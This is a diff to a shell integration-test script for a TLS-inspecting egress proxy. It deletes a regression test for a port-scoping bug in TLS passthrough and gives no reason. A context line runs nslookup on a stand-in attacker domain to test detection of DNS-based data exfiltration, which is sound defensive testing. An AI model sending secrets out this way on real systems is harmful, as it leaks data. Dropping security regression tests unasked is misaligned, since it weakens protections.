@@ -141,18 +141,6 @@ echo "=== [TLS passthrough] ==="
 OUT=$($S --insecure https://tlspass.example.com/public/x)
 check_ok "GET tlspass.example.com (passthrough)" "$OUT" "PUBLIC GET"
 
-# Regression for the port-scoping bug fixed in haproxy-config.ts: the same
-# SNI on a port allow_tls_rules does NOT name (9443, vs the rule's 443) must
-# not be treated as passthrough. Two things prove that here, not just one:
-# no --insecure (the origin's own self-signed cert would fail verification;
-# only the proxy's CA-issued leaf cert, trusted via ca-trust.ts, verifies),
-# and a clean HTTP-level 403 rather than a raw TLS/connection failure (which
-# is what the bug produced when do-resolve failed or hit the internal-address
-# guard before the inspected path ever ran).
-echo "=== [TLS passthrough - wrong port must fall through to inspection] ==="
-CODE=$($C https://tlspass.example.com:9443/public/x)
-check_status "GET tlspass.example.com:9443 (not in allow_tls_rules)" "$CODE" "403"
-
 echo "=== [DNS-only exfiltration] ==="
 (nslookup SECRET-IN-A-NAME.attacker.example >/dev/null 2>&1 || true)
 echo "  PASS  queried (checked in the report, see integration-test-inspect-restrict.sh)"
